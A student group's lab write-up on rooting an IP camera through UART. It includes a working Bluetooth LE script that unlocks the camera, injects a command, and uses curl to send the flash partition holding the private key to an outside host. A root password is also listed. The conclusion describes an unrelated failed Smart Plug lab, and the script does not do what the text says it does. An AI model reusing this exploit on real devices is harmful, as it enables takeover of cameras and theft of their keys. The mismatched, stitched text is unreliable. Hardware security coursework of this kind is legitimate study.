# Research Group: Group A

## Laboratory Title: Exploiting an IP Camera

### Members:
- Ángel Vázquez
- Carolina Rodríguez
- Gabriel Figueroa
- Keishlyany Sanabria (Shadow)

## Lab Description:
### Objective and Goals:
##### Device Teardown
- Open the device
- Identify the chipset and their datasheet
- Find communication protocols used by different chips
- Analize System-on-Chip (SoC)
##### UART Pin Identification
- Find UART pads with the help of SoC pinouts
- Find UART pads/pins (pair of 4), which will provide the functionality for Transmit (Tx), Receive (Rx), GNG (Ground) and Vcc (Power)
- Find Tx, Rx, and Ground above the SoC
- Connect pins to Attify Badge and perform UART exploitation
##### Gain Root Access
- Find the baudrate of the device
- Interact over UART to obtain a root shell
- Find root password using the script and mac address
- Login to root user 

### Resources and Dependencies used:
##### Hardware:
- IP Camera
- Screwdriver kit
- Multimeter
- Attify Badge
- Jumper wires
- Micro USB Cable
##### Software:
- baudrate.py
- minicom


### Tasks (Lab Walkthrough):
##### Device Teardown (Setup):
1. Open up the device
2. Identify the various chipsets on the device (SoC, Network chip, Flash chip) 
3. Figure out their functionality, as well as locate their datasheets.
##### Pin Identification
1. Identify which pins correspond to the UART and see where the connection ends up. These pins are mostly assembled in groups of 3 or 4, and consist of connections for Rx, Tx, and Ground.
2. Perform a continuity test on the exposed pads 
##### Interacting with UART and Gain Root Shell Access
1. First, make sure that the camera board is properly connected to a power source, Attify Badge, and the breadboard (UART connection) to replace soldering
2. Once inside the Attify Virtual Machine, access the terminal and use the following commands in order to find the baudrate:

```
cd ~/tools/dev/tty*      ; lists the ttys available and make sure the badge is present

cd baudrate/             ; access the location of the baudrate.py script

sudo python baudrate.py  ; run the script, disconnect & connect the badge again
```


3. Press the **Up** arrow key to switch the preferred baudrate to 5500(?)
4. Let the script run; once you see readable data, hit **Ctrl+C** and wait for the script to ask you for the name you want to save the configuration with. Give it any name and hit **Enter**.
5. On a separate window, run the following script (```extract-private-key.py```) using the device mac address to get the needed password
```#extract-private-key.py
import hashlib
import base64
import asyncio

from bleak import BleakClient

# Pin code printed on the camera label
pincode = b"096641"

# The mac address of the IP camera to connect
mac_addr = "b0:c5:54:4b:8f:49"

def generate_cmd(cmd):
    return "P=;N={}&&({})&".format(pincode, cmd).encode()


def generate_unlock_command(device_name, pincode, challenge):
    hashit = device_name + pincode + challenge
    key = base64.b64encode(hashlib.md5(hashit).digest())[:16]
    return "M=0;K=".encode() + key


async def execute_cmd(client, cmdstr):
    cmd = generate_cmd(cmdstr)
    await client.write_gatt_char(
        "0000a201-0000-1000-8000-00805f9b34fb", cmd, response=True
    )


async def setup_wifi(client, essid, passwd):
    wifi_cfg = "M=0;I=" + essid + ";S=4;E=2;K=" + passwd
    await client.write_gatt_char(
        "0000a101-0000-1000-8000-00805f9b34fb", wifi_cfg.encode(), response=True
    )

    await client.write_gatt_char(
        "0000a102-0000-1000-8000-00805f9b34fb", "C=1".encode(), response=True
    )


async def main(mac_addr: str):
    async with BleakClient(mac_addr) as client:
        device_name = await client.read_gatt_char(
            "00002a00-0000-1000-8000-00805f9b34fb"
        )
        print("[+] Device name: ", device_name.decode())

        a001_data = await client.read_gatt_char("0000a001-0000-1000-8000-00805f9b34fb")
        M = a001_data.split(b";")[0].split(b"=")[1]
        C = a001_data.split(b";")[1].split(b"=")[1]

        if M == b"0":
            print("[+] Unlocked: Yes")
        else:
            print("[+] Unlocked: No")
            print("[*] Unlocking...")
            challenge = C
            print("[*] Challenge:", challenge.decode())

            unlock_cmd = generate_unlock_command(device_name, pincode, challenge)
            print("[*] Unlock command:", unlock_cmd.decode())

            await client.write_gatt_char(
                "0000a001-0000-1000-8000-00805f9b34fb", unlock_cmd, response=True
            )

            a001_data = await client.read_gatt_char(
                "0000a001-0000-1000-8000-00805f9b34fb"
            )
            M = a001_data.split(b";")[0].split(b"=")[1]

            if M != b"0":
                print("[!] Unlock failed")
                return
            else:
                print("[+] Successfully unlocked")

        print("[+] Setting up WiFi...")
        await setup_wifi(client, "acer", "11223344")

        print("[+] Press enter when camera is connected (status led:stable green)")
        input()

        print("[+] Exfiltrating private key")
        await execute_cmd(client, "curl -T /dev/mtd1ro http://10.42.0.1:8080")


loop = asyncio.get_event_loop()
loop.run_until_complete(main(mac_addr))
```

6. Enter the root login user and password (555718df)
7. Press ls to see all root files available


### Problems Encountered:
- Difficulty finding the correct datasheets for the chips.
- Difficulty finding the ```baudrate.py file```. Had to use the locate command to find the python file since a “no such file or directory exists” error popped up upon trying it for the first time.
- Device is not recognized by Computer. When looking for the entry names ttyUSB0 or ttyUSB1 to confirm if Attify Badge was connected, nothing was found, which meant it was not recognized.
- Port configuration made laptop crash and restart


### Conclusion:
The research group (Group A) conducted a lab to exploit a Smart Plug. The objective of the lab was to reverse engineer the mobile application used to control the Smart Plug, capture and analyze its network traffic, identify the encryption key and type being used, and control the Smart Plug without using the mobile device. In conclusion, Group A was unable to complete the Exploiting a Smart Plug lab due to difficulties controlling the smart plug. The outdated Python script used to create a proxy server to redirect traffic from the plug to the group's system was not functioning properly, which prevented the group from controlling the plug. Despite attempts to work around the issue, the group was unable to overcome this obstacle within the timeframe of the lab.
